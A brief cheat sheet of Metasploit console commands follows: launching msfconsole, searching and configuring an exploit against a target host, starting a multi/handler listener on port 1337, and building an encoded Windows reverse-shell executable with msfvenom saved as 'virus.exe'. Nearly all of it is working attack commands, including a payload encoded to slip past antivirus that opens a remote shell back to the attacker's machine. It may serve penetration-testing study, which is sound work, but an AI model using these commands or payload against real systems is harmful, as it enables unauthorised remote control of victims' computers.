#start metasploit :
/opt/metasploit-framework/bin/msfconsole

#search for exploit :
search exploitname

#show what option need to be filled :
show options

#set the options :
set RHOSTS 10.0.0.0

#set the lhost :
set LHOST 10.1.0.25

#creating netcat listener :
use exploit/multi/handler
set LHOST 10.9.1.25
set LPORT 1337
exploit -j

Creating Windows Payload :
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.25 LPORT=1337 -e x86/shikata_ga_nai -f exe -o virus.exe